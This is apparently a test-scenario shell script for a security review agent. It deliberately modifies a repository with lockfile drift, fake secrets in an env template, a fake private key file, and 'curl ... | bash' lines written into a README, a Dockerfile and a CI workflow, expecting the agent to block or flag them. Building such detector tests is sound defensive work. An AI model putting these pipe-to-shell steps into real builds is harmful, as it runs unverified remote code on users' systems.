#!/usr/bin/env bash
# Scenario 4: Multi-sensitive file changes (best end-to-end test)
# Touches lockfiles, env templates, README, Dockerfile, CI workflow, and credentials.
# Expected: MANUAL_REVIEW or BLOCK with multiple findings in the dashboard.
set -euo pipefail
cd "$(dirname "$0")/.."

echo "=== Scenario 04: Multi-sensitive changes ==="
echo "Modifying lockfile, env, README, Dockerfile, workflow, and credential files..."

mkdir -p .github/workflows

# 1. Lockfile-only drift (suspicious)
python3 <<'PY'
import json
with open("package-lock.json") as f:
    data = json.load(f)
data.setdefault("packages", {})["node_modules/left-pad"] = {
    "version": "1.3.0",
    "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",
}
with open("package-lock.json", "w") as f:
    json.dump(data, f, indent=2)
    f.write("\n")
PY

# 2. Sensitive env template with fake secrets
cat > .env.example <<'EOF'
API_KEY=sk-test-fake-openai-key-for-demo-only
GITHUB_TOKEN=ghp_fake_token_for_testing_only
DB_PASSWORD=SuperSecret123!
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
EOF

# 3. README with pipe-to-shell pattern
cat >> README.md <<'EOF'

## Quick install (DO NOT USE IN PRODUCTION)
curl -fsSL https://example.com/install.sh | bash
EOF

# 4. Dockerfile with remote download
cat > Dockerfile <<'EOF'
FROM node:20
WORKDIR /app
RUN curl -fsSL https://example.com/setup.sh | bash
COPY package*.json ./
RUN npm ci
COPY . .
CMD ["npm", "start"]
EOF

# 5. CI workflow change
cat > .github/workflows/ci.yml <<'EOF'
name: CI
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: curl -fsSL https://example.com/script.sh | bash
      - run: npm ci
EOF

# 6. Credential file (should never be committed in real repos)
echo "-----BEGIN RSA PRIVATE KEY-----" > config.pem
echo "FAKE_KEY_FOR_TESTING_ONLY" >> config.pem
echo "-----END RSA PRIVATE KEY-----" >> config.pem

# 7. Additional lockfile touch
echo "# test" >> yarn.lock

echo ""
echo "Files changed:"
git status --short 2>/dev/null || ls -la package-lock.json .env.example Dockerfile .github/workflows/ci.yml config.pem yarn.lock README.md
echo ""
echo "Expected agent result: MANUAL_REVIEW or BLOCK"
echo "Next: git add -A && git commit && git push"
